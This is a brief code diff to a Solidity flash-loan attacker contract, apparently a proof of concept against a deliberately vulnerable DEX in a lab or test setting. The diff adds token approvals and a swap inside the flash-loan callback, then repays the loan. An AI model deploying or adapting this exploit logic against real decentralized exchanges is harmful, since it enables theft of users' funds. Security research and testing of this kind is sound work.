@@ -5,6 +5,7 @@ interface IERC20 {
     function transfer(address to, uint256 amount) external returns (bool);
     function transferFrom(address, address, uint256) external returns (bool);
     function balanceOf(address account) external view returns (uint256);
+    function approve(address spender, uint256 amount) external returns (bool);
 }
 
 interface IFlashLoanProvider {
@@ -50,13 +51,12 @@ contract FlashLoanAttacker {
     }
 
     function executeOnFlashLoan(uint256 amount) external {
-        require(msg.sender == address(flashLoanProvider), "bad caller");
+    require(msg.sender == address(flashLoanProvider), "bad caller");
 
+        tokenA.approve(dex, type(uint256).max);
+        tokenB.approve(dex, type(uint256).max);
 
-        tokenA.transfer(address(dex), 0);
-        tokenA.transferFrom(msg.sender, address(this), 0);
-
-        uint256 tokenBReceived = IVulnerableDEX(dex).swapAForB(amount);
+        IVulnerableDEX(dex).swapAForB(amount);
 
         require(
             tokenA.transfer(address(flashLoanProvider), amount),
